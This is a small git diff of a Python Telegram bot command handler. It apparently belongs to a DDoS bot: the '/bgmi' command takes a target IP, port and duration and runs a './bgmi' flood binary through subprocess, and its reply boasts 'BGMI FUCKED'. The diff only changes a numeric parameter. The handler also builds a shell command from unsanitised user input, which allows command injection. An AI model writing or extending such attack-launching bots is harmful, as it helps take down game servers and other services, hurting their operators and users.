@@ -190,7 +190,7 @@ def handle_bgmi(message):
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 750"
+                    full_command = f"./bgmi {target} {port} {time} 360"
                     subprocess.run(full_command, shell=True)
                     response = f"🎮BGMI FUCKED🎮\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
             except ValueError:
